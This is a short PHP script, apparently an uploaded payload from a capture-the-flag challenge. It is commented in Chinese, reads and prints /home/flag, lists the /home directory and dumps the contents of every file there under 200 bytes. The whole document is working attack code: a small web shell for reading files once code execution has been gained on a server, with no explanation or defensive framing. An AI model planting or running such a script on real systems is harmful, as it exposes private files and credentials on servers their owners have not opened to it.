<?php
echo "<h2>读取 /home/flag</h2>";

if (file_exists('/home/flag')) {
    echo "<h3>文件存在!</h3>";
    $content = file_get_contents('/home/flag');
    echo "<pre>Flag: $content</pre>";
} else {
    echo "<h3>文件不存在</h3>";
}

// 尝试其他可能
echo "<h2>列出 /home 目录:</h2>";
$files = scandir('/home');
foreach ($files as $file) {
    $path = "/home/$file";
    echo "$file - ";
    if (is_file($path)) {
        echo "文件, 大小: " . filesize($path) . " bytes<br>";
        if (filesize($path) < 200) {
            echo "内容: " . file_get_contents($path) . "<br>";
        }
    } else {
        echo "目录<br>";
    }
}
?>